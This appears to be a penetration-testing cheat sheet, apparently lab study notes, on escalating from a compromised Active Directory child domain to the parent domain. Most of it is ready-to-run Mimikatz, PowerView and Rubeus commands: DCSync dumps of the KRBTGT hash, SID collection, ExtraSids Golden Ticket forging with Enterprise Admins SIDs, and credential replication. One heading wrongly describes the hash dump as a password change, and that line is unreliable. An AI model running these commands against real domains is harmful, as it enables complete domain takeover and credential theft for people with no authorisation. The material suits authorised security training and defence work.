# From Windows

## SID History Primer

The sidHistory attribute is used for migration purposes, allowing users to access resources in the original domain after migration. 
However, attackers can misuse it through SID history injection. 
By using Mimikatz, they can add an administrator account to the SID history attribute of a compromised account. 
When logging in with this account, all associated SIDs are added to the user's token, determining their access rights. 
If the SID of a Domain Admin account is added, the attacker gains DCSync and can create Golden Tickets or Kerberos ticket-granting tickets, 
enabling them to authenticate as any account in the chosen domain for further persistence.

### ExtraSids Attack - Mimikatz
the purpose is to create a Golden Ticket from the compromised child domain to compromise the parent domain.

To perform this attack after compromising a child domain, we need the following:

    The KRBTGT hash for the child domain
    The SID for the child domain
    The name of a target user in the child domain (does not need to exist!)
    The FQDN of the child domain.
    The SID of the Enterprise Admins group of the root domain.
    With this data collected, the attack can be performed with Mimikatz.

### 1-change the password of the KRBTGT account // Obtaining the KRBTGT Account's NT Hash using Mimikatz
```powershell
mimikatz # lsadump::dcsync /user:childdomainname\krbtgt
```
### we can also get the SID wiht Get-DomainSID function
```powershell
Get-DomainSID
```
### Obtain the Enterprise Admins Group's SID using Get-DomainGroup
```powershell
Get-DomainGroup -Domain MYDOMAIN.LOCAL -Identity "Name Of The Groupe" | select distinguishedname,objectsid
```
### Using ls to Confirm No Access
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
### Creating a Golden Ticket with Mimikatz
we can now create a Golden Ticket to access all resources within the parent domain.
```powershell
kerberos::golden /user:CreatedUserName /domain:CHILDNAME.MYDOMAIN.LOCAL /sid:S-1-5-21-28063819-2093948-9222689 /krbtgt:9d765b4771505cbe974115964d5f /sids:S-1-5-21-38939050-38817879-28663114-519 /ptt
```
### Confirming  Kerberos Ticket is in Memory 
```powershell
klist
```

Now we have access for any resources within the parent domain, and we could compromise the parent domain in several ways.

### Listing the Entire C: Drive of the Domain Controller
```powershell
ls \\computer'sname.mydomain.local\c$
```

## ExtraSids Attack - Rubeus
this attack can be also also perform using Rubeus
### Check access
```powershell
ls \\computer'sname.mydomain.local\c$
```
### Creating a Golden Ticket using Rubeus
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe974115964d5f /domain:CHILD.MYDOMAIN.LOCAL /sid:S-1-5-21-28053819-29893948-92272689  /sids:S-1-5-21-38429050-38817879-28663114-519 /user:CreatedUserName /ptt
# The /rc4 flag is the NT hash for the KRBTGT account.
# The /sids flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.
```
### Confirming  Kerberos Ticket is in Memory 
```powershell
klist
```
## Performing a DCSync Attack
```powershell
.\mimikatz.exe
lsadump::dcsync /user:MYDOMAIN\username
# we have to specify the exact domain to perform the DCSync operation
lsadump::dcsync /user:MYDOMAIN\username /domain:MYDOMAIN.LOCAL

```




